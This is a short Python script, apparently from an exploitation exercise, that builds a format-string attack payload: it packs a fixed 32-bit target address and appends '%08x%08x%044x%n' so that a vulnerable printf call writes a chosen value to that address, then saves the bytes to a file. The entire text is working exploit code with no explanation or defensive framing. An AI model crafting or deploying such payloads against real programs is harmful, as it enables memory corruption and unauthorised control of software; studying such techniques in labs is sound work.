import struct

addr = struct.pack("<I", 0x804988c)
payload = addr + b"%08x%08x%044x%n"
with open("payload", "wb") as f:
    f.write(payload)